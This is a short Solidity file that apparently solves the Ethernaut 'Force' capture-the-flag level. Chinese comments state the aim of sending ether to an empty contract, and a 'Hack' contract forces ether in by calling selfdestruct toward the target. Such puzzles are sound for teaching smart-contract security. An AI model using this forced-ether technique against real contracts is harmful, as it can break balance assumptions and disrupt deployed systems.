// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
//前期提要，这题是要使得这个空合约得到钱
//解题思路：使用自毁合约的方式
contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
contract Hack {
    constructor(address payable _target)payable {
        selfdestruct(_target);
    }
    
}